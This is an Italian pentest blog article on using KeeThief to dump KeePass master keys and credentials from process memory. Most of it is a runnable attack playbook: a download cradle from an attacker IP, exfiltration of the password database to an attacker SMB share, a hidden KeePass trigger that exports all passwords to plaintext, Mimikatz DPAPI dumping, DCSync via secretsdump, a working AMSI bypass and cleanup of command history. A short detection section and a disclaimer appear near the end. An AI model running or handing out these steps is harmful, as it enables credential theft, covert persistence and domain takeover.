---
title: 'KeeThief: dump di master key e credenziali da KeePass'
slug: keethief
description: 'KeeThief: come estrarre master key e credenziali da KeePass durante un pentest autorizzato. Dump da memoria, file .kdbx, limiti operativi, detection e post-exploitation.'
image: /Gemini_Generated_Image_1uaqry1uaqry1uaq.webp
draft: false
date: 2026-02-07T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - credential dumping
  - active directory
---

KeeThief estrae il **composite key material** direttamente dalla RAM del processo `KeePass.exe`, permettendo il dump delle credenziali senza conoscere la master password.

Tecnica mappata a **MITRE ATT\&CK T1555.005 – Password Managers**.

Qui trovi il funzionamento reale del tool, il workflow operativo completo, tecniche avanzate (incluso backdoor via trigger KeePass) e cosa viene realmente rilevato in fase di detection.

## Come Funziona KeeThief (Meccanica Reale)

KeePass protegge il database `.kdbx` con una **composite key**: combinazione di master password, key file opzionale e/o Windows User Account (DPAPI). Quando l'utente sblocca il database, KeePass deriva la chiave crittografica e la mantiene in memoria finché il database resta aperto.

KeeThief scansiona la memoria del processo `KeePass.exe` alla ricerca di questa struttura. Legge il **key material derivato** e i componenti associati (password in chiaro, path del key file, flag DPAPI), ricostruendo la composite key.

**Non è un bruteforce. Non interagisce con il file `.kdbx`. Legge la chiave direttamente dalla RAM del processo KeePass.**

Tool: [GhostPack/KeeThief](https://github.com/GhostPack/KeeThief)\
Autori: Lee Christensen ([@tifkin\_](https://twitter.com/tifkin_)) + Will Schroeder ([@HarmJ0y](https://twitter.com/harmj0y))

***

## Prerequisiti Operativi

* KeePass 2.x in esecuzione sul target con database **sbloccato**
* Accesso al processo nello stesso contesto utente, oppure local admin / SYSTEM
* PowerShell + .NET Framework 4.0+
* `KeeThief.ps1` + `KeePassLib.dll` nella stessa directory

**Limiti reali:**

* Se il database è bloccato (screensaver, lock manuale), la chiave non è più in memoria → nulla da estrarre
* KeePassXC non è supportato: scritto in C++, struttura in memoria completamente diversa
* KeePass 1.x: formato `.kdb`, architettura diversa → KeeThief non funziona

**Setup:**

```bash
git clone https://github.com/GhostPack/KeeThief.git
```

Trasferimento sul target (in-memory, niente disco):

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22/KeeThief.ps1')
```

Da disco:

```powershell
Import-Module .\KeeThief.ps1
```

**Verifica processo attivo:**

```powershell
Get-Process KeePass -ErrorAction SilentlyContinue
```

***

## Workflow Operativo: Dal Processo al Database

### Step 1 — Estrai la composite key

```powershell
Get-KeePassDatabaseKey -Verbose
```

**Scenario 1 – Solo master password:**

```
[*] Finding KeePass password...
[*] Found KeePass process: KeePass (PID: 3284)

Database  : C:\Users\it-admin\Documents\passwords.kdbx
KeyType   : Password
Key       : Str0ngM@sterP@ss!
```

**Scenario 2 – Password + key file:**

```
Database  : C:\Users\admin\corp.kdbx
KeyType   : PasswordAndKeyFile
Key       : Corp2025!
KeyFile   : C:\Users\admin\Documents\corp.key
```

Recupera sia il `.kdbx` che il `.key` per aprire il database.

**Scenario 3 – Windows User Account (DPAPI):**

```
Database  : C:\Users\admin\corp.kdbx
KeyType   : WindowsUserAccount
DPAPI     : True
```

Se sei nel contesto di quell'utente o SYSTEM, il decrypt è trasparente. Altrimenti serve la DPAPI master key → vedi [dump DPAPI con Mimikatz](https://hackita.it/articoli/mimikatz).

### Step 2 — Scarica il database

```powershell
# Via SMB
copy C:\Users\admin\Documents\passwords.kdbx \\10.10.14.22\share\

# Via certutil (base64 encode)
certutil -encode passwords.kdbx C:\Windows\Temp\b64.txt
```

### Step 3 — Accedi al database con la chiave estratta

**Con kpcli (sulla tua macchina):**

```bash
kpcli --kdb passwords.kdbx
# Inserisci la master key quando richiesto
kpcli:/> ls
kpcli:/> show -f <entry>
```

**Con PoShKeePass (PowerShell, se preferisci automazione):**

```powershell
Import-Module PoShKeePass
New-KeePassDatabaseConfiguration -DatabaseProfileName 'corp' `
    -DatabasePath 'C:\loot\passwords.kdbx' `
    -MasterKey (ConvertTo-SecureString 'Str0ngM@sterP@ss!' -AsPlainText -Force)
Get-KeePassEntry -DatabaseProfileName 'corp' -AsPlainText
```

PoShKeePass è un modulo separato — non parte di KeeThief. Usalo offline sulla tua macchina con il `.kdbx` già scaricato.

***

## Target Prioritari: Dove Trovare KeePass in un Engagement

```powershell
# Trova processi KeePass attivi con utente (richiede permessi elevati)
Get-Process KeePass -IncludeUserName

# Cerca tutti i database sul filesystem
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue |
    Select-Object FullName, LastWriteTime
```

**Dove guardare:** workstation sysadmin, jump box, RDP/terminal server, macchine IT con sessioni attive.

Su un terminal server con più utenti:

```
UserName          Id   ProcessName
--------          --   -----------
CORP\it-admin   3284   KeePass
CORP\svc-sql    5128   KeePass
CORP\net-ops    7412   KeePass
```

Ogni processo è un database separato. Esegui `Get-KeePassDatabaseKey` nel contesto di ciascun utente, iterando sui PID o operando da SYSTEM.

**Discovery remoto via CrackMapExec:**

```bash
crackmapexec smb 172.16.0.0/24 -u admin -p 'Password1' \
  -x "tasklist /fi \"imagename eq KeePass.exe\""
```

Identifica i target con KeePass attivo prima di muoverti.

***

## Tecnica Avanzata: KeePass Trigger Backdoor

KeePass supporta **trigger automatici** configurabili via XML. Puoi iniettare un trigger che esporta tutte le password in plaintext ogni volta che l'utente apre il database — senza che se ne accorga.

Il file di configurazione è `KeePass.config.xml` (path tipico: `%APPDATA%\KeePass\`) oppure `KeePass.config.enforced.xml` per configurazioni di dominio.

**Trigger da iniettare nel config XML:**

```xml
<Triggers>
  <Trigger>
    <Guid><!-- genera con [System.Guid]::NewGuid() --></Guid>
    <Name>Sync</Name>
    <Events>
      <Event>
        <TypeGuid>5f8TBoW4QYm5BvaeKztApw==</TypeGuid>
        <!-- Evento: dopo l'apertura del database -->
      </Event>
    </Events>
    <Actions>
      <Action>
        <TypeGuid>D5prW87VRr65NO2xP5RIIg==</TypeGuid>
        <!-- Azione: esporta in formato testo -->
        <Parameters>
          <Parameter>C:\Windows\Temp\export.txt</Parameter>
          <Parameter>{DB_DIR}</Parameter>
          <Parameter>KeePass CSV</Parameter>
          <Parameter></Parameter>
          <Parameter>true</Parameter>
        </Parameters>
      </Action>
    </Actions>
  </Trigger>
</Triggers>
```

KeeThief include `KeePass-ConfigTrigger.ps1` per automatizzare l'iniezione:

```powershell
. .\KeePass-ConfigTrigger.ps1
Add-KeePassConfigTrigger -OutputPath C:\Windows\Temp\export.txt
```

Al successivo sblocco del database da parte dell'utente, trovi tutte le credenziali in `export.txt`. Tecnica ideale per engagement prolungati o quando non puoi estrarre la master key in tempo reale.

**Cleanup post-exploit:**

```powershell
Remove-KeePassConfigTrigger
```

***

## Crack Offline (KeePass non in esecuzione)

Se trovi un `.kdbx` ma il processo non è attivo, hai due strade:

**John the Ripper:**

```bash
keepass2john passwords.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Hashcat:**

```bash
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
```

**Realtà del crack:** KeePass 2.x usa **Argon2d** come KDF di default (configurabile: iterations, memory, parallelism). Su CPU aspettati \~100 tentativi/secondo. Su GPU migliora, ma con configurazioni Argon2d agressive rimane un problema serio. KeeThief bypassa tutto questo estraendo la chiave da memoria — è sempre la prima scelta quando KeePass è attivo.

***

## Alternativa: Minidump + Analisi Offline

Se l'EDR blocca KeeThief ma `ProcDump` (binario Microsoft firmato) è disponibile o trasferibile:

```cmd
procdump.exe -ma 3284 C:\Windows\Temp\keepass.dmp
```

Trasferisci il dump sulla tua macchina e analizzalo con KeeThief in locale:

```powershell
Get-KeePassDatabaseKey -DumpFile .\keepass.dmp
```

ProcDump raramente viene flaggato perché è un tool legittimo Sysinternals. Il dump avviene in pochi secondi.

***

## DPAPI + KeePass: Quando l'Account Windows è la Chiave

Con `KeyType: WindowsUserAccount`, KeePass usa DPAPI per proteggere il database. Se non sei nel contesto di quell'utente:

```bash
# Estrai la DPAPI master key con Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi
```

Poi decripta la chiave KeePass con i blob DPAPI trovati. Workflow completo nella guida [DPAPI credential extraction](https://hackita.it/articoli/dpapi).

***

## Attack Chain: Da KeePass a Domain Admin

**Prerequisito:** shell su workstation sysadmin, stesso contesto utente o local admin.

```powershell
# 1. Verifica
Get-Process KeePass

# 2. Estrai composite key
Import-Module .\KeeThief.ps1
Get-KeePassDatabaseKey -Verbose

# 3. Scarica il database
copy C:\Users\it-admin\passwords.kdbx \\10.10.14.22\share\

# 4. Apri e dumpa le entry (offline, su tua macchina)
kpcli --kdb passwords.kdbx
# oppure PoShKeePass
```

**Da credenziali KeePass a lateral movement:**

```bash
# Testa le credenziali sul dominio
crackmapexec smb 172.16.0.0/24 -u da-admin -p 'D0m@in_Adm!n_2025' -d CORP

# DCSync se hai domain admin
secretsdump.py CORP/da-admin:'D0m@in_Adm!n_2025'@dc01.corp.local
```

Per la persistenza post-domain compromise → [Scheduled Task sul Domain Controller](https://hackita.it/articoli/scheduled) o [Active Directory persistence](https://hackita.it/articoli/active-directory).

***

## Detection (Blue Team Perspective)

### Cosa monitora un EDR moderno

* **ReadProcessMemory su KeePass.exe** — CrowdStrike Falcon e Microsoft Defender for Endpoint hanno regole specifiche su process injection / memory read verso processi noti come gestori di credenziali
* **Caricamento di KeePassLib.dll da path anomali** — `%TEMP%`, `%APPDATA%`, share di rete: tutti path che non corrispondono all'installazione legittima
* **Script PowerShell sospetti** — AMSI intercetta il contenuto prima dell'esecuzione; ScriptBlock Logging (Event ID 4104) registra il testo dello script anche ofuscato

### Log da monitorare

| Source     | Event ID | Cosa indica                                               |
| ---------- | -------- | --------------------------------------------------------- |
| Sysmon     | 10       | Process Access — KeeThief che legge la memoria di KeePass |
| Sysmon     | 7        | Image Loaded — KeePassLib.dll da path non standard        |
| WinSec     | 4663     | Object Access su file `.kdbx`                             |
| PowerShell | 4104     | ScriptBlock Logging — contenuto KeeThief                  |

### Modifica al config KeePass (Trigger Backdoor)

* Sysmon Event ID 11 su `KeePass.config.xml` da process non KeePass
* Hash del file di configurazione — qualsiasi modifica a `KeePass.config.xml` / `.enforced.xml` fuori dall'orario utente è anomala

### Evasion

**AMSI bypass prima dell'import:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Carica KeePassLib.dll da reflection (niente file su disco):**

```powershell
$bytes = [System.IO.File]::ReadAllBytes('\\10.10.14.22\share\KeePassLib.dll')
[System.Reflection.Assembly]::Load($bytes)
```

**Minidump con ProcDump** (già coperto sopra) — abbassa il profilo di detection evitando di eseguire codice nel contesto di KeePass.

### Cleanup

```powershell
Remove-Item .\KeeThief.ps1, .\KeePassLib.dll -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

***

## Toolchain Comparison

| Tool                                                               | Target                         | Processo attivo richiesto | Output                           | Stealth |
| ------------------------------------------------------------------ | ------------------------------ | ------------------------- | -------------------------------- | ------- |
| **KeeThief**                                                       | KeePass 2.x                    | Sì (DB unlocked)          | Composite key in chiaro          | ★★★☆    |
| keepass2john + John/[Hashcat](https://hackita.it/articoli/hashcat) | KeePass .kdbx                  | No                        | Hash → crack (lento con Argon2d) | ★★★★    |
| [LaZagne](https://hackita.it/articoli/lazagne)                     | Multi (KeePass, browser, WiFi) | Dipende                   | Plaintext variabile              | ★★★☆    |
| Mimikatz DPAPI                                                     | KeePass con WUA                | Sì (DPAPI blob)           | Chiave derivata                  | ★★☆☆    |
| SharpKeePass                                                       | KeePass 2.x                    | Sì                        | Composite key                    | ★★★☆    |
| KeePass Trigger Backdoor                                           | KeePass 2.x                    | No (config mod)           | CSV export automatico            | ★★★★    |

Per il credential dumping su altri vettori (LSASS, SAM, LSA secrets) → [credential dumping](https://hackita.it/articoli/credential-dumping).

***

## Troubleshooting

| Problema                                  | Causa                              | Fix                                                                                |
| ----------------------------------------- | ---------------------------------- | ---------------------------------------------------------------------------------- |
| Nessun output da `Get-KeePassDatabaseKey` | Database bloccato                  | Aspetta sblocco utente oppure usa trigger backdoor                                 |
| `Access Denied` sulla memoria             | Permessi insufficienti             | Escalation a local admin o SYSTEM; usa token impersonation                         |
| `KeePassLib.dll not found`                | DLL assente nella stessa directory | Posizionala accanto a `KeeThief.ps1` oppure caricala via reflection                |
| AMSI blocca l'import                      | Windows Defender AMSI attivo       | Esegui bypass AMSI prima dell'import                                               |
| KeePass 1.x sul target                    | Formato `.kdb`, non supportato     | Approccio diverso: dump memoria manuale + analisi offline                          |
| Key file su share irraggiungibile         | Permessi SMB mancanti              | Monta la share con credenziali: `net use \\fileserver\keys$ /user:CORP\admin Pass` |
| KeePassXC invece di KeePass               | C++, struttura diversa             | KeeThief non funziona → dump processo + analisi manuale del memory layout          |

***

## Cheat Sheet

| Azione                        | Comando                                                                                                                                |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| Trova processi KeePass        | `Get-Process KeePass -IncludeUserName`                                                                                                 |
| Estrai composite key          | `Get-KeePassDatabaseKey -Verbose`                                                                                                      |
| Cerca file .kdbx              | `Get-ChildItem C:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue`                                                              |
| Scarica database via certutil | `certutil -encode passwords.kdbx C:\Windows\Temp\b64.txt`                                                                              |
| Apri database da CLI          | `kpcli --kdb passwords.kdbx`                                                                                                           |
| Crack offline                 | `keepass2john file.kdbx > hash.txt && john --wordlist=rockyou.txt hash.txt`                                                            |
| Minidump processo             | `procdump.exe -ma <PID> keepass.dmp`                                                                                                   |
| Trigger backdoor              | `. .\KeePass-ConfigTrigger.ps1; Add-KeePassConfigTrigger -OutputPath C:\Windows\Temp\export.txt`                                       |
| AMSI bypass                   | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| Discovery remoto              | `crackmapexec smb 172.16.0.0/24 -u admin -p 'Pass' -x "tasklist /fi \"imagename eq KeePass.exe\""`                                     |

***

## FAQ — KeeThief e KeePass

### KeeThief funziona se KeePass è bloccato?

No. La composite key è presente in memoria solo quando il database è **sbloccato**. Se KeePass è locked, non puoi estrarre nulla.

### Serve essere admin per usare KeeThief?

Dipende.

* Stesso utente KeePass → no
* Utente diverso → serve **local admin o SYSTEM** per accedere alla memoria del processo

### KeeThief funziona con KeePassXC?

No. KeePassXC è scritto in C++ e ha una struttura in memoria diversa. KeeThief funziona solo con **KeePass 2.x (.NET)**.

### KeeThief è meglio del crack offline del file .kdbx?

Sì. KeeThief bypassa completamente il KDF (Argon2) estraendo la chiave dalla RAM. Il crack offline è lento e spesso impraticabile.

### Cosa succede se l’utente usa key file o DPAPI?

KeeThief estrae comunque i componenti della composite key:

* Password
* Path del key file
* Flag DPAPI\
  Se hai accesso al contesto utente, puoi decriptare tutto.

### KeeThief lascia tracce?

Sì. Le principali detection sono:

* ReadProcessMemory su KeePass.exe
* Caricamento anomalo di KeePassLib.dll
* Script PowerShell (AMSI / Event ID 4104)

### Posso usare KeeThief in modo stealth?

Parzialmente. Tecniche comuni:

* AMSI bypass
* Minidump con ProcDump (analisi offline)
* Caricamento DLL in memoria (reflection)

### KeeThief funziona da remoto?

Non direttamente. Devi avere:

* shell sul target
  oppure
* esecuzione remota (WinRM, SMB, ecc.)

### Qual è lo scenario reale più comune?

Workstation sysadmin con KeePass aperto:
→ dump key\
→ accesso al database\
→ credenziali AD / SSH / Cloud\
→ lateral movement

### KeeThief è rilevato dagli EDR?

Sì, spesso. EDR moderni monitorano:

* accesso alla memoria
* pattern PowerShell sospetti
* caricamento DLL anomale\
  Serve evasione per ambienti difesi.

**Disclaimer:** KeeThief è uno strumento di ricerca per penetration test autorizzati. L'accesso non autorizzato a credenziali è reato penale. Usa solo con autorizzazione scritta del proprietario del sistema. Repository ufficiale: [github.com/GhostPack/KeeThief](https://github.com/GhostPack/KeeThief).
